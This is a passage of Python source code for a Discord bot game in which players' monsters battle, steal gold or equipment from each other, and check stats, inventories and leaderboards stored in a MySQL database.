                embed.set_author(name=f"Congratulations {self.view.opponent.display_name}!",
                                 icon_url=self.view.opponent.avatar.url)
                embed.timestamp = discord.utils.utcnow()
                embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
                embed.add_field(name=self.view.p1freak,
                                value=f"Health \U00002764 - `{self.view.p1health}`")
                embed.add_field(name=self.view.p2freak,
                                value=f"Health \U00002764 - `{self.view.p2health}`")

                view = WinView(self.view.opponent, self.view.ctx.author,
                               self.view.p2equipmentstealpercent, self.view.p2goldstealpercent)

                await interaction.response.edit_message(embed=embed, view=view)

                view.msg = await interaction.original_message()


class WinView(discord.ui.View):
    def __init__(self, winner, loser, equipmentstealpercent, goldstealpercent):
        super().__init__()
        self.winner = winner
        self.loser = loser
        self.equipmentstealpercent = equipmentstealpercent
        self.goldstealpercent = goldstealpercent
        self.msg = None

    @discord.ui.button(label='Claim Winnings', style=discord.ButtonStyle.green)
    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.winner:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.winner.mention}... Win your own battles!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        await self.msg.edit(view=self)

        mycursor.execute("SELECT gold, equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                         {'userID': self.loser.id})
        for x in mycursor:
            losergold = x[0]
            equipment = [x[1], x[2], x[3]]

        isequipmentsteal = False
        canstealequipment = False
        equipmentstealvalue = random.randrange(1, 101)
        if equipmentstealvalue > self.equipmentstealpercent:
            isequipmentsteal = False
        elif equipmentstealvalue < self.equipmentstealpercent and (equipment[0] != None or equipment[1] != None or equipment[2] != None):
            isequipmentsteal = True

        if equipment[0] != None or equipment[1] != None or equipment[2] != None:
            canstealequipment = True

        if not isequipmentsteal:  # goldsteal
            if losergold >= 1000:
                goldammount = (self.goldstealpercent/100) * losergold
                mycursor.execute("UPDATE Users SET gold = gold + %(gold)s WHERE userID=%(userID)s",
                                 {'userID': self.winner.id, 'gold': goldammount})
                mycursor.execute("UPDATE Users SET gold = gold - %(gold)s WHERE userID=%(userID)s",
                                 {'userID': self.loser.id, 'gold': goldammount})
                mydb.commit()

            elif losergold > 330:
                goldammount = 200
                mycursor.execute("UPDATE Users SET gold = gold + %(gold)s WHERE userID=%(userID)s",
                                 {'userID': self.winner.id, 'gold': goldammount})
                mycursor.execute("UPDATE Users SET gold = gold - %(gold)s WHERE userID=%(userID)s",
                                 {'userID': self.loser.id, 'gold': goldammount})
                mydb.commit()

            elif losergold <= 330 and canstealequipment:
                isequipmentsteal = True
                goldammount = 0
                
            else:
                goldammount = 200
                mycursor.execute("UPDATE Users SET gold = gold + %(gold)s WHERE userID=%(userID)s",
                                 {'userID': self.winner.id, 'gold': goldammount})
                mydb.commit()

            embed = discord.Embed(
                title=f"{self.winner.display_name} won a battle against {self.loser.display_name}!", color=embedcolor)
            embed.set_footer(text=footertext, icon_url=self.winner.guild.icon.url)
            embed.set_author(name=f"{self.winner.display_name}",
                             icon_url=self.winner.avatar.url)
            embed.timestamp = discord.utils.utcnow()
            embed.set_thumbnail(url=self.winner.guild.icon.url)
            embed.add_field(name="Reward", value=f"`{goldammount} Gold`")

        if isequipmentsteal:  # equipmentsteal
            if "TB" in equipment:
                reward = "`Tea Bag`"
                item = "tb"

            elif "D" in equipment:
                reward = "`Deathspike`"
                item = "d"

            elif "EH" in equipment:
                reward = "`Enchanted Headpiece`"
                item = "eh"

            elif "MA" in equipment:
                reward = "`Mystic Artifact`"
                item = "ma"

            elif "PA" in equipment:
                reward = "`Platinum Armour`"
                item = "pa"

            elif "O" in equipment:
                reward = "`Ooze`"
                item = "o"

            elif "VV" in equipment:
                reward = "`Vital Vial`"
                item = "vv"

            elif "RN" in equipment:
                reward = "`Rune Necklace`"
                item = "rn"

            elif "IH" in equipment:
                reward = "`Iron Helmet`"
                item = "ih"

            elif "SB" in equipment:
                reward = "`Standard Blade`"
                item = "sb"

            elif "SS" in equipment:
                reward = "`Standard Shield`"
                item = "ss"

            elif "HD" in equipment:
                reward = "`Hidden Dagger`"
                item = "hd"

            mycursor.execute("UPDATE Users SET {} = {} + 1 WHERE userID=%(userID)s".format(item, item),
                             {'userID': self.winner.id})
            mycursor.execute("UPDATE Users SET {} = {} - 1 WHERE userID=%(userID)s".format(item, item),
                             {'userID': self.loser.id})
            mycursor.execute("UPDATE Users SET equipment1 = NULL WHERE userID=%(userID)s AND equipment1=%(equip)s",
                             {'userID': self.loser.id, 'equip': item.upper()})
            mycursor.execute("UPDATE Users SET equipment2 = NULL WHERE userID=%(userID)s AND equipment2=%(equip)s",
                             {'userID': self.loser.id, 'equip': item.upper()})
            mycursor.execute("UPDATE Users SET equipment3 = NULL WHERE userID=%(userID)s AND equipment3=%(equip)s",
                             {'userID': self.loser.id, 'equip': item.upper()})
            mydb.commit()

            embed = discord.Embed(
                title=f"{self.winner.display_name} won a battle against {self.loser.display_name}!", color=embedcolor)
            embed.set_footer(text=footertext, icon_url=self.winner.guild.icon.url)
            embed.set_author(name=f"{self.winner.display_name}",
                             icon_url=self.winner.avatar.url)
            embed.timestamp = discord.utils.utcnow()
            embed.set_thumbnail(url=self.winner.guild.icon.url)
            embed.add_field(name="Reward", value=reward)

        await interaction.response.send_message(f"{self.winner.mention}, {self.loser.mention}", embed=embed)


class BattleDropDownView(discord.ui.View):
    def __init__(self, ctx, opponent, p1freak, p1attacklowname, p1attackhighname, p1buff1name, p1buff2name, p1buff1description, p1buff2description, p1attacklow, p1attackhigh, p1health, p1defense, p1highdefense, p1lowdefense, p1lowaccuracy, p1highaccuracy, p1piercepercent, p1equipmentstealpercent, p1goldstealpercent, p2freak, p2attacklowname, p2attackhighname, p2buff1name, p2buff2name, p2buff1description, p2buff2description, p2attacklow, p2attackhigh, p2health, p2defense, p2highdefense, p2lowdefense, p2lowaccuracy, p2highaccuracy, p2piercepercent, p2equipmentstealpercent, p2goldstealpercent, p1turn, round, p1freakyid, p2freakyid):
        super().__init__()
        self.ctx = ctx
        self.opponent = opponent
        self.msg = None
        self.p1turn = p1turn
        self.round = round

        self.p1freak = p1freak
        self.p1freakyid = p1freakyid
        self.p1attacklowname = p1attacklowname
        self.p1attackhighname = p1attackhighname
        self.p1buff1name = p1buff1name
        self.p1buff2name = p1buff2name
        self.p1buff1description = p1buff1description
        self.p1buff2description = p1buff2description
        self.p1attacklow = p1attacklow
        self.p1attackhigh = p1attackhigh
        self.p1health = p1health
        self.p1defense = p1defense
        self.p1highdefense = p1highdefense
        self.p1lowdefense = p1lowdefense
        self.p1lowaccuracy = p1lowaccuracy
        self.p1highaccuracy = p1highaccuracy
        self.p1piercepercent = p1piercepercent
        self.p1equipmentstealpercent = p1equipmentstealpercent
        self.p1goldstealpercent = p1goldstealpercent

        self.p2freak = p2freak
        self.p2freakyid = p2freakyid
        self.p2attacklowname = p2attacklowname
        self.p2attackhighname = p2attackhighname
        self.p2buff1name = p2buff1name
        self.p2buff2name = p2buff2name
        self.p2buff1description = p2buff1description
        self.p2buff2description = p2buff2description
        self.p2attacklow = p2attacklow
        self.p2attackhigh = p2attackhigh
        self.p2health = p2health
        self.p2defense = p2defense
        self.p2highdefense = p2highdefense
        self.p2lowdefense = p2lowdefense
        self.p2lowaccuracy = p2lowaccuracy
        self.p2highaccuracy = p2highaccuracy
        self.p2piercepercent = p2piercepercent
        self.p2equipmentstealpercent = p2equipmentstealpercent
        self.p2goldstealpercent = p2goldstealpercent

        if self.p1turn:
            self.add_item(BattleDropdown(self.p1attacklowname, f"{self.p1attacklow} Attack Damage", self.p1attackhighname,
                          f"{self.p1attackhigh} Attack Damage", self.p1buff1name, self.p1buff1description, self.p1buff2name, self.p1buff2description))
        else:
            self.add_item(BattleDropdown(self.p2attacklowname, f"{self.p2attacklow} Attack Damage", self.p2attackhighname,
                          f"{self.p2attackhigh} Attack Damage", self.p2buff1name, self.p2buff1description, self.p2buff2name, self.p2buff2description))

    async def on_timeout(self):
        if self.msg:
            await self.msg.edit(embed=discord.Embed(description="**Timed out... Cancelled battle!**", color=embedcolor), view=None)


class ConfirmBattle(discord.ui.View):
    def __init__(self, ctx, opponent):
        super().__init__()
        self.ctx = ctx
        self.opponent = opponent
        self.msg = None

    @discord.ui.button(label='Yes', style=discord.ButtonStyle.green)
    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.opponent:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.opponent.mention}!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        await self.msg.edit(view=self)

        mycursor.execute("SELECT freak, gold, equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                         {'userID': self.ctx.author.id})

        for x in mycursor:
            p1lowaccuracy = 75
            p1highaccuracy = 35
            p1piercepercent = 0
            p1equipmentstealpercent = x[1] // 100
            if p1equipmentstealpercent > 40:
                p1equipmentstealpercent = 40
            p1goldstealpercent = 20
            p1highdefense = 0
            p1lowdefense = 0
            p1freakyid = x[0]

            if x[0] == "V":
                p1freak = f"{self.ctx.author.display_name} - Vampire"
                p1attacklowname = vampireattacklowname
                p1attackhighname = vampireattackhighname
                p1buff1name = vampirebuff1name
                p1buff2name = vampirebuff2name
                p1buff1description = "+10 Accuracy"
                p1buff2description = "+15 Attack Damage"
                p1attacklow = vampirebaseattacklow
                p1attackhigh = vampirebaseattackhigh
                p1health = vampirebasehealth
                p1defense = vampirebasedefense

            elif x[0] == "W":
                p1freak = f"{self.ctx.author.display_name} - Werewolf"
                p1attacklowname = werewolfattacklowname
                p1attackhighname = werewolfattackhighname
                p1buff1name = werewolfbuff1name
                p1buff2name = werewolfbuff2name
                p1buff1description = "+10 Accuracy"
                p1buff2description = "+10 Defense"
                p1attacklow = werewolfbaseattacklow
                p1attackhigh = werewolfbaseattackhigh
                p1health = werewolfbasehealth
                p1defense = werewolfbasedefense

            elif x[0] == "S":
                p1freak = f"{self.ctx.author.display_name} - Skeleton"
                p1attacklowname = skeletonattacklowname
                p1attackhighname = skeletonattackhighname
                p1buff1name = skeletonbuff1name
                p1buff2name = skeletonbuff2name
                p1buff1description = "+15 Attack Damage"
                p1buff2description = "+10 Defense"
                p1attacklow = skeletonbaseattacklow
                p1attackhigh = skeletonbaseattackhigh
                p1health = skeletonbasehealth
                p1defense = skeletonbasedefense

            equipped = [x[2], x[3], x[4]]

            if "HD" in equipped:
                p1attackhigh += 10
            if "SB" in equipped:
                p1attacklow += 10
            if "O" in equipped:
                p1attacklow += 10
                p1attackhigh += 10
            if "SS" in equipped:
                p1highdefense += 10
            if "IH" in equipped:
                p1lowdefense += 5
            if "PA" in equipped:
                p1defense += 10
            if "RN" in equipped:
                p1lowaccuracy += 10
            if "MA" in equipped:
                p1lowaccuracy += 10
            if "EH" in equipped:
                p1lowaccuracy += 10
                p1highaccuracy += 10
            if "VV" in equipped:
                p1health += 20
            if "D" in equipped:
                p1piercepercent += 15
            if "TB" in equipped:
                p1equipmentstealpercent += 10
                p1goldstealpercent += 5

        mycursor.execute("SELECT freak, gold, equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                         {'userID': self.opponent.id})

        for x in mycursor:
            p2lowaccuracy = 75
            p2highaccuracy = 35
            p2piercepercent = 0
            p2equipmentstealpercent = x[1] // 100
            if p2equipmentstealpercent > 40:
                p2equipmentstealpercent = 40
            p2goldstealpercent = 20
            p2highdefense = 0
            p2lowdefense = 0
            p2freakyid = x[0]

            if x[0] == "V":
                p2freak = f"{self.opponent.display_name} - Vampire"
                p2attacklowname = vampireattacklowname
                p2attackhighname = vampireattackhighname
                p2buff1name = vampirebuff1name
                p2buff2name = vampirebuff2name
                p2buff1description = "+10 Accuracy"
                p2buff2description = "+15 Attack Damage"
                p2attacklow = vampirebaseattacklow
                p2attackhigh = vampirebaseattackhigh
                p2health = vampirebasehealth
                p2defense = vampirebasedefense

            elif x[0] == "W":
                p2freak = f"{self.opponent.display_name} - Werewolf"
                p2attacklowname = werewolfattacklowname
                p2attackhighname = werewolfattackhighname
                p2buff1name = werewolfbuff1name
                p2buff2name = werewolfbuff2name
                p2buff1description = "+10 Accuracy"
                p2buff2description = "+10 Defense"
                p2attacklow = werewolfbaseattacklow
                p2attackhigh = werewolfbaseattackhigh
                p2health = werewolfbasehealth
                p2defense = werewolfbasedefense

            elif x[0] == "S":
                p2freak = f"{self.opponent.display_name} - Skeleton"
                p2attacklowname = skeletonattacklowname
                p2attackhighname = skeletonattackhighname
                p2buff1name = skeletonbuff1name
                p2buff2name = skeletonbuff2name
                p2buff1description = "+15 Attack Damage"
                p2buff2description = "+10 Defense"
                p2attacklow = skeletonbaseattacklow
                p2attackhigh = skeletonbaseattackhigh
                p2health = skeletonbasehealth
                p2defense = skeletonbasedefense

            equipped = [x[2], x[3], x[4]]

            if "HD" in equipped:
                p2attackhigh += 10
            if "SB" in equipped:
                p2attacklow += 10
            if "O" in equipped:
                p2attacklow += 10
                p2attackhigh += 10
            if "SS" in equipped:
                p2highdefense += 10
            if "IH" in equipped:
                p2lowdefense += 5
            if "PA" in equipped:
                p2defense += 10
            if "RN" in equipped:
                p2lowaccuracy += 10
            if "MA" in equipped:
                p2lowaccuracy += 10
            if "EH" in equipped:
                p2lowaccuracy += 10
                p2highaccuracy += 10
            if "VV" in equipped:
                p2health += 20
            if "D" in equipped:
                p2piercepercent += 15
            if "TB" in equipped:
                p2equipmentstealpercent += 10
                p2goldstealpercent += 5

        p1turn = True
        round = 1

        embed = discord.Embed(
            title=f"{self.ctx.author.display_name} vs {self.opponent.display_name}", color=embedcolor)
        embed.set_footer(text=footertext, icon_url=self.ctx.guild.icon.url)
        embed.set_author(name=f"{self.ctx.author.display_name}'s Turn - Round 1",
                         icon_url=self.ctx.author.avatar.url)
        embed.timestamp = discord.utils.utcnow()
        embed.set_thumbnail(url=self.ctx.guild.icon.url)
        embed.add_field(name=p1freak, value=f"Health \U00002764 - `{p1health}`")
        embed.add_field(name=p2freak, value=f"Health \U00002764 - `{p2health}`")

        view = BattleDropDownView(self.ctx, self.opponent, p1freak, p1attacklowname, p1attackhighname, p1buff1name, p1buff2name, p1buff1description, p1buff2description, p1attacklow, p1attackhigh, p1health, p1defense, p1highdefense, p1lowdefense, p1lowaccuracy, p1highaccuracy, p1piercepercent, p1equipmentstealpercent, p1goldstealpercent,
                                  p2freak, p2attacklowname, p2attackhighname, p2buff1name, p2buff2name, p2buff1description, p2buff2description, p2attacklow, p2attackhigh, p2health, p2defense, p2highdefense, p2lowdefense, p2lowaccuracy, p2highaccuracy, p2piercepercent, p2equipmentstealpercent, p2goldstealpercent, p1turn, round, p1freakyid, p2freakyid)

        await interaction.response.send_message(f"{self.ctx.author.mention}, {self.opponent.mention}", embed=embed, view=view)

        view.msg = await interaction.original_message()

    @discord.ui.button(label='No', style=discord.ButtonStyle.red)
    async def cancel(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.opponent:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.opponent.mention}!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        await self.msg.edit(view=self)

        await interaction.response.send_message(f"{self.ctx.author.mention}{self.opponent.mention}", embed=discord.Embed(description="**Cancelled battle!**", color=embedcolor))

    async def on_timeout(self):
        if self.msg:
            await self.msg.edit(embed=discord.Embed(description="**Timed out... Cancelled battle!**", color=embedcolor), view=None)


class Battle(commands.Cog):

    def __init__(self, client):
        self.client = client

    # Commands
    @slash_command(guild_ids=guildIDs, description="Battle with your Freak")
    async def battle(self, ctx, opponent: discord.Member):
        if ctx.author == opponent:
            await ctx.respond(embed=discord.Embed(description=f"**You can't battle against yourself!**", color=embedcolor), ephemeral=True)
            return

        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': ctx.author.id})
        for x in mycursor:
            if x[0] == 0:
                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
                return

        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': opponent.id})
        for x in mycursor:
            if x[0] == 0:
                await ctx.respond(embed=discord.Embed(description=f"**{opponent.mention} doesn't have a Freak!**", color=embedcolor), ephemeral=True)
                return

        view = ConfirmBattle(ctx, opponent)

        await ctx.respond(f"{ctx.author.mention}, {opponent.mention}", embed=discord.Embed(description=f"**{opponent.mention}, you have been challenged to a battle by {ctx.author.mention}! Do you accept?**", color=embedcolor), view=view)

        view.msg = await ctx.interaction.original_message()

    @slash_command(guild_ids=guildIDs, description="Equip your equipment")
    async def armoury(self, ctx):
        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': ctx.author.id})
        for x in mycursor:
            if x[0] == 0:
                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
                return

        mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                         {'userID': ctx.author.id})

        for x in mycursor:
            equipments = []
            for equipment in x:
                if equipment == "HD":
                    equipments.append("Hidden Dagger")
                elif equipment == "SB":
                    equipments.append("Standard Blade")
                elif equipment == "O":
                    equipments.append("Ooze")
                elif equipment == "SS":
                    equipments.append("Standard Shield")
                elif equipment == "IH":
                    equipments.append("Iron Helmet")
                elif equipment == "PA":
                    equipments.append("Platinum Armour")
                elif equipment == "RN":
                    equipments.append("Rune Necklace")
                elif equipment == "MA":
                    equipments.append("Mystic Artifact")
                elif equipment == "EH":
                    equipments.append("Enchanted Headpiece")
                elif equipment == "VV":
                    equipments.append("Vital Vial")
                elif equipment == "D":
                    equipments.append("Deathspike")
                elif equipment == "TB":
                    equipments.append("Tea Bag")

            while len(equipments) < 3:
                equipments.append("None equipped")

            embed = discord.Embed(title=f"{ctx.author.display_name}'s Equipment",
                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`", color=embedcolor)
            embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
            embed.timestamp = discord.utils.utcnow()

            view = Equip(ctx)
            await ctx.respond(embed=embed, view=view)
            view.msg = await ctx.interaction.original_message()

    @slash_command(guild_ids=guildIDs, description="See all your stats")
    async def stats(self, ctx):
        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': ctx.author.id})
        for x in mycursor:
            if x[0] == 0:
                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
                return

        mycursor.execute("SELECT freak, equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                         {'userID': ctx.author.id})

        for x in mycursor:
            embed = discord.Embed(title=f"{ctx.author.display_name}'s Stats", color=embedcolor)
            embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
            embed.timestamp = discord.utils.utcnow()

            lowaccuracy = baseattacklowaccuracy
            highaccuracy = baseattackhighaccuracy

            if x[0] == "V":
                embed.set_thumbnail(url=vampireimgurl)
                freakname = "Vampire"
                buff1 = "+10 Accuracy"
                buff2 = "+15 Attack Damage"
                health = vampirebasehealth
                defense = vampirebasedefense
                buff1name = vampirebuff1name
                buff2name = vampirebuff2name
                attacklow = vampirebaseattacklow
                attackhigh = vampirebaseattackhigh
                attacklowname = vampireattacklowname
                attackhighname = vampireattackhighname

            elif x[0] == "W":
                embed.set_thumbnail(url=werewolfimgurl)
                freakname = "Werewolf"
                buff1 = "+10 Accuracy"
                buff2 = "+10 Defense"
                health = werewolfbasehealth
                defense = werewolfbasedefense
                buff1name = werewolfbuff1name
                buff2name = werewolfbuff2name
                attacklow = werewolfbaseattacklow
                attackhigh = werewolfbaseattackhigh
                attacklowname = werewolfattacklowname
                attackhighname = werewolfattackhighname

            elif x[0] == "S":
                embed.set_thumbnail(url=skeletonimgurl)
                freakname = "Skeleton"
                buff1 = "+15 Attack Damage"
                buff2 = "+10 Defense"
                health = skeletonbasehealth
                defense = skeletonbasedefense
                buff1name = skeletonbuff1name
                buff2name = skeletonbuff2name
                attacklow = skeletonbaseattacklow
                attackhigh = skeletonbaseattackhigh
                attacklowname = skeletonattacklowname
                attackhighname = skeletonattackhighname

            equipment = [x[1], x[2], x[3]]
            equipmentnames = []

            if "HD" in equipment:
                attackhigh += 10
                equipmentnames.append("Hidden Dagger")

            if "SB" in equipment:
                attacklow += 5
                equipmentnames.append("Standard Blade")

            if "O" in equipment:
                attacklow += 10
                attackhigh += 10
                equipmentnames.append("Ooze")

            if "PA" in equipment:
                defense += 10
                equipmentnames.append("Platinum Armour")

            if 'SS' in equipment and 'IH' in equipment:
                defense = str(
                    defense) + ' plus an additional 10 Defense against high attacks and an additional 5 Defense against low attacks'
                equipmentnames.append("Standard Shield")
                equipmentnames.append("Iron Helmet")

            elif 'SS' in equipment:
                equipmentnames.append("Standard Shield")
                defense = str(defense) + ' plus an additional 10 Defense against high attacks'
            elif 'IH' in equipment:
                equipmentnames.append("Iron Helmet")
                defense = str(defense) + ' plus an additional 5 Defense against low attacks'

            if "EH" in equipment:
                equipmentnames.append("Enchanted Headpiece")
                lowaccuracy += 10
                highaccuracy += 10

            if "RN" in equipment:
                equipmentnames.append("Rune Necklace")
                lowaccuracy += 10

            if "MA" in equipment:
                equipmentnames.append("Mystic Artifact")
                highaccuracy += 10

            if "VV" in equipment:
                health += 20
                equipmentnames.append("Vital Vial")

            if "D" in equipment:
                equipmentnames.append("Deathspike")

            if "TB" in equipment:
                equipmentnames.append("Tea Bag")

            listequipment = ""
            for equip in equipmentnames:
                listequipment = f"{listequipment}{equip}\n"
                
            if listequipment == "":
                listequipment = "No equipment"

            embed.add_field(name="Freak", value=freakname, inline=False)
            embed.add_field(name="Equipment", value=listequipment, inline=False)
            embed.add_field(
                name="Stats", value=f"Health \U00002764 - `{health}`\nDefense \U0001f6e1 - `{defense}`", inline=False)
            embed.add_field(
                name="Skills", value=f"{attacklowname} - `{attacklow} Attack Damage`\n{attackhighname} - `{attackhigh} Attack Damage`\n{buff1name} - `{buff1}`\n{buff2name} - `{buff2}`", inline=False)
            embed.add_field(
                name="Accuracy", value=f"Accuracy for Low Attacks - `{lowaccuracy}%`\nAccuracy for High Attacks - `{highaccuracy}%`", inline=False)

            if "D" in equipment and "TB" in equipment:
                embed.add_field(
                    name="Bonus", value="15% pierce chance for all attacks *(ignore Defense)* and 10% chance to equipment steal and 5% value to gold steal", inline=False)

            elif "D" in equipment:
                embed.add_field(
                    name="Bonus", value=f"15% pierce chance for all attacks *(ignore Defense)*", inline=False)

            elif "TB" in equipment:
                embed.add_field(
                    name="Bonus", value=f"10% chance to equipment steal and 5% value to gold steal", inline=False)

            await ctx.respond(embed=embed)

    @slash_command(guild_ids=guildIDs, description="Check the role leaderboard")
    async def roleleaderboard(self, ctx):
        whitelistusers = []
        peasantusers = []
        whitelistfields = []
        peasantfields = []
        description = ""
        membersinleaderboard = 0

        whitelistrole = ctx.guild.get_role(whitelistroleid)

        mycursor.execute(f"SELECT userID FROM Users ORDER BY gold DESC")
        myresult = mycursor.fetchall()

        for userid in myresult:
            member = ctx.guild.get_member(userid[0])
            if member != None:
                if whitelistrole in member.roles:
                    whitelistusers.append(member)
                else:
                    peasantusers.append(member)

        for user in whitelistusers:
            mycursor.execute("SELECT gold FROM users WHERE userID=%(userID)s", {'userID': user.id})

            for gold in mycursor:
                balance = gold[0]

            description = f"{description}\n**{whitelistusers.index(user) + 1}.** {user.mention} - `{balance} Gold`"

            membersinleaderboard += 1

            if membersinleaderboard == 10:
                whitelistfields.append(description)
                membersinleaderboard = 0
                description = ""
                if len(whitelistfields) == 10:
                    break

        if not whitelistfields:
            whitelistfields.append(description)
            description = ""
            membersinleaderboard = 0

        for user in peasantusers:
            mycursor.execute("SELECT gold FROM users WHERE userID=%(userID)s", {'userID': user.id})

            for gold in mycursor:
                balance = gold[0]

            description = f"{description}\n**{peasantusers.index(user) + 1}.** {user.mention} - `{balance} Gold`"

            membersinleaderboard += 1

            if membersinleaderboard == 10:
                peasantfields.append(description)
                membersinleaderboard = 0
                description = ""
                if len(peasantfields) == 10:
                    break

        if not peasantfields:
            peasantfields.append(description)
            description = ""
            membersinleaderboard = 0

        leaderboardembed = discord.Embed(title="Leaderboard - Page 1", color=embedcolor)
        leaderboardembed.set_thumbnail(url=pfpurl)
        leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
        leaderboardembed.timestamp = discord.utils.utcnow()
        leaderboardembed.add_field(name="Whitelist", value=whitelistfields[0], inline=False)
        leaderboardembed.add_field(name="Peasants ", value=peasantfields[0], inline=False)

        leaderboardview = RoleLeaderboardDropdownView(whitelistfields, peasantfields)

        await ctx.respond(embed=leaderboardembed, view=leaderboardview)

        leaderboardview.msg = await ctx.interaction.original_message()

    @slash_command(guild_ids=guildIDs, description="Check the general leaderboard")
    async def leaderboard(self, ctx):
        enddescription = []
        userids = []
        description = ""
        membersinleaderboard = 0

        mycursor.execute(f"SELECT userID FROM Users ORDER BY gold DESC LIMIT 100")
        myresult = mycursor.fetchall()

        for x in myresult:
            userids.append(x[0])

        for userid in userids:
            mycursor.execute("SELECT gold FROM users WHERE userID=%(userID)s", {'userID': userid})

            for gold in mycursor:
                balance = gold[0]

            description = f"{description}\n**{userids.index(userid) + 1}.** <@!{userid}> - `{balance} Gold`"

            membersinleaderboard += 1

            if membersinleaderboard == 10:
                enddescription.append(description)
                membersinleaderboard = 0
                description = ""

        if not enddescription:
            enddescription.append(description)

        leaderboardembed = discord.Embed(
            title="Leaderboard - Page 1", description=enddescription[0], color=embedcolor)
        leaderboardembed.set_thumbnail(url=pfpurl)
        leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
        leaderboardembed.timestamp = discord.utils.utcnow()

        leaderboardview = LeaderboardDropdownView(enddescription)

        await ctx.respond(embed=leaderboardembed, view=leaderboardview)

        leaderboardview.msg = await ctx.interaction.original_message()

    @slash_command(guild_ids=guildIDs, description="Check your items/equipment")
    async def inventory(self, ctx):
        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': ctx.author.id})
        for x in mycursor:
            if x[0] == 0:
                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
                return

        mycursor.execute("SELECT hd,sb,o,ss,ih,pa,rn,ma,eh,vv,d,tb FROM Users WHERE userID=%(userID)s",
                         {'userID': ctx.author.id})
        for x in mycursor:
            embed = discord.Embed(title=f"{ctx.author.display_name}'s Inventory", color=embedcolor)
            embed.set_thumbnail(url=ctx.guild.icon.url)
            embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
            embed.timestamp = discord.utils.utcnow()
            embed.add_field(
                name="Items/Equipment", value=f"Hidden Dagger - `{x[0]}`\nStandard Blade - `{x[1]}`\nOoze - `{x[2]}`\nStandard Shield - `{x[3]}`\nIron Helmet - `{x[4]}`\nPlatinum Armour - `{x[5]}`\nRune Necklace - `{x[6]}`\nMystic Artifact - `{x[7]}`\nEnchanted Headpiece - `{x[8]}`\nVital Vial - `{x[9]}`\nDeathspike - `{x[10]}`\nTea Bag - `{x[11]}`")

            await ctx.respond(embed=embed)

    @slash_command(guild_ids=guildIDs, description="Check your Gold")
    async def balance(self, ctx):
        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': ctx.author.id})
        for x in mycursor:
            if x[0] == 0:
                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
                return

        mycursor.execute("SELECT gold FROM Users WHERE userID=%(userID)s",
                         {'userID': ctx.author.id})
        for x in mycursor:
            embed = discord.Embed(title=f"{ctx.author.display_name}'s Balance",
                                  description=f"`{x[0]} Gold`", color=embedcolor)
            embed.set_thumbnail(url=ctx.guild.icon.url)
            embed.set_footer(text=footertext, icon_url=ctx.guild.icon.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
            embed.timestamp = discord.utils.utcnow()

            await ctx.respond(embed=embed)

    @slash_command(guild_ids=guildIDs, description="Go hunting with your Freak")
    async def hunt(self, ctx):
        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
                         'userID': ctx.author.id})
        for x in mycursor:
            if x[0] == 0:
                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
                return

        mycursor.execute("SELECT hunted FROM Users WHERE userID=%(userID)s",
                         {'userID': ctx.author.id})
        for x in mycursor:
            if x[0]:
                await ctx.respond(embed=discord.Embed(description="**You've already hunted in the past 12 hours!**", color=embedcolor), ephemeral=True)

            elif not x[0]:
                huntvalue = random.randrange(1, 201)
                if huntvalue > 0 and huntvalue <= 20:
                    mycursor.execute(
                        "UPDATE Users SET gold = gold + 100, hunted=True WHERE userID=%(userID)s", {'userID': ctx.author.id})
                    mydb.commit()
                    winnings = "100 Gold"

                elif huntvalue > 20 and huntvalue <= 80:
